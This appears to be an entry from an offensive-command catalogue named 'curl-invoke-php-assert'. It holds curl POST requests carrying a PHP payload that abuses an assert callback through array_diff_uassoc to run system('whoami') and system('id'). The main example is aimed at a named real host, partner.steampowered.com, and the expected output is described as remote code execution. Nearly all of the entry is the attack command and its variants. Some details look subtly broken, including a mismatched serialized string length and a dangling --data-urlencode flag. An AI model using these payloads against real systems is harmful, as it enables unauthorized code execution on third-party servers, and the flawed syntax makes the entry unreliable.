---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
data: >-
  curl -X POST https://partner.steampowered.com/endpoint -d
  "function_name=array_diff_uassoc&param_types=array,array,string&param1=\"a:1:{s:6:\"0\";s:6:\"assert\"}\"
  &param2=\"assert\" &param3=\"system('whoami');\" " -v
tags:
  - rce
  - php
  - curl
  - exploit
type: command
output: 'Response containing output from executed command, e.g., ''www-data''.'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.408Z'
verified: false
validated: true
submitted: true
---
# curl-invoke-php-assert

## Command

```bash
curl -X POST https://partner.steampowered.com/endpoint \
  -d "function_name=array_diff_uassoc&param_types=array,array,string&param1=\"a:1:{s:6:\"0\";s:6:\"assert\"}\" &param2=\"assert\" &param3=\"system('whoami');\" " \
  -v
```

## Description

Invokes the assert function via manipulated parameters to execute arbitrary PHP code through eval.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST request | Yes |
| `-d` | Payload with assert callback and code | Yes |
| `-v` | Verbose output | No |

## Examples

### Basic Usage

```bash
curl -X POST https://target/endpoint -d "param3=\"phpinfo();\" " -v
```

### Advanced Usage

```bash
curl -X POST https://target/endpoint -d "function_name=array_diff_uassoc&param3=\"system('id');\" " --data-urlencode -v
```

## Expected Output

Includes results of the executed code, such as user identity or system info, indicating RCE.

## Related

- [[Related Procedure: Invoke-Assert-Function-for-Arbitrary-Code-Execution]]
